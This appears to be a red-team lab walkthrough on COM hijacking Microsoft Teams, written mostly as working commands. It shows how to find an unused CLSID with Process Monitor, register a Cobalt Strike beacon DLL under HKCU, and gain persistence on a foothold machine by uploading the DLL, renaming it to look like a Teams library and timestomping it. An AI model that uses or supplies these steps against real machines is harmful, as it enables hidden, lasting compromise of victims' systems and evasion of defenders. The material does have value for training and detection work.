
### Test COM Hijacking
- Open Procmon64.exe_ as a local admin.
    
-  Select **Filter > Filter** (or use **Ctrl + L**).
    
-  Add the following filters:
    1.  Process Name is ms-teams.exe then Include.
    2.  Operation is RegOpenKey then Include.
    3.  Path ends with InprocServer32 then Include.
    4.  Result is NAME NOT FOUND then Include.
    5.  Click OK.
-  Run Microsoft Teams from the Windows Start Menu and observe the events in Process Monitor.

 >You want a CLSID that is only called a few times. We'll use 7D096C5F-AC08-4F1F-BEB7-5C22C517CE39 in this lab.
 
 -  Quit Teams from the taskbar.
    
-  Use PowerShell to add the following registry entries and test the hijack:

```powershell
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}"

New-Item -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"

New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

- Launch Cobalt Strike and connect to the Team Server.
    
-  Run Microsoft Teams again and a Beacon should appear, running in ms-teams.exe.

### Persistence on Foothold Machine
From the Beacon running as pchilds:

1.  Change Beacon's working directory.

```powershell
cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64

ls
```

2.  Upload the DLL payload to disk.

```powershell
upload C:\Payloads\http_x64.dll
```

3.  Rename and timestomp the DLL to help it blend in.

```powershell
mv http_x64.dll Microsoft.Teams.HttpClient.dll

timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
```

4.  Add the registry entries.

```powershell
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"

reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```


Next time teams will run the beacon will be executed